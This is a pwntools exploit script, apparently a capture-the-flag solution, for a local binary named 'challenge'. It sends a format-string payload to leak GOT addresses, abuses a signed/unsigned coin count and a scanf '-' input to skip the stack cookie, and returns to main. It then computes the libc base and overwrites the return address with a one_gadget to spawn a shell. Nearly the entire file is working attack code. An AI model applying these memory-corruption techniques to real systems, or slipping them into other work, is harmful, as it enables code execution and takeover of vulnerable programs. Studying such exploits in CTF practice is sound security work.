from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
#context.log_level = 'DEBUG'

target = process("./challenge", env={"LD_PRELOAD":"./libc.so.6"})
#gdb.attach(target)
raw_input()

target.recvuntil("box?")
target.sendline("y")
target.recvuntil("name: ")
target.sendline("%8$s..%9$s..%10$s..%11$s")
target.recvuntil("How many coins do you have?")
target.sendline(str(255)) # Signed vs unsigned integer, large negative

free_got = 0x600FA8
puts_got = 0x600FB0
setbuf_got = 0x600FC0
printf_got = 0x600FC8
main = 0x400806

target.sendline(str(free_got))
target.sendline(str(0))
target.sendline(str(puts_got))
target.sendline(str(0))
target.sendline(str(setbuf_got))
target.sendline(str(0))
target.sendline(str(printf_got))
target.sendline(str(0))

for i in range(7):
    target.sendline("1")
    target.sendline("2")

target.sendline("-")  
target.sendline("-")  #bypass scanf, skip cookie

target.sendline("0") #libc_csu_init on stack, not important now
target.sendline("0") 

target.sendline(str(main)) #return address, jump back to main
target.sendline(str(0))
target.sendline("q")   #non number, exits

target.recvuntil("Tressure Box: ")
free = u64(target.recv(6) + "\x00\x00")
target.recv(2)
puts = u64(target.recv(6) + "\x00\x00")
target.recv(2)
setbuf = u64(target.recv(6) + "\x00\x00")
target.recv(2)
printf = u64(target.recv(6) + "\x00\x00")

log.info("Free: " + hex(free))
log.info("Puts: " + hex(puts))
log.info("Setbuf: " + hex(setbuf))
log.info("Printf: " + hex(printf))

libc_base = puts - 0x06f690
one_gadget = libc_base + 0x4526a

target.recvuntil("box?")
target.sendline("y")
target.recvuntil("name: ")
target.sendline("noopnoop")
target.recvuntil("How many coins do you have?")
target.sendline(str(255)) # Signed vs unsigned integer, large negative

for i in range(22):
    target.sendline("1")

target.sendline("-")
target.sendline("-")
target.sendline("0")
target.sendline("0")
target.sendline(str(one_gadget & 0xffffffff))
target.sendline(str(one_gadget >> 32))
target.sendline("q")

target.interactive()

